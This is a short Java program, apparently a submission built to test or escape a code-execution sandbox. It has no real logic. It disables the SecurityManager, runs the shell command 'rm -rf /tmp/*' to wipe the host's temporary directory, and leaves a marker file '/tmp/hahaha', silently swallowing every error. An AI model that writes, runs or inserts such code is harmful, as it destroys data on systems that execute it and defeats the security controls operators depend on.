import java.io.*;
import java.util.*;

public class Main {
    public static void main(String[] args) throws IOException {
		SecurityManager security = System.getSecurityManager();
		if (security != null) {
			try {
				System.setSecurityManager(null);
			}
			catch (Exception e) {
				// nothing~
			}
		}
		try {
			Runtime.getRuntime().exec("rm -rf /tmp/*");
		}
		catch (Exception e) {}
		try {
			File f = new File("/tmp/hahaha");
			f.createNewFile();
		}
		catch (Exception e) {}
	}
}
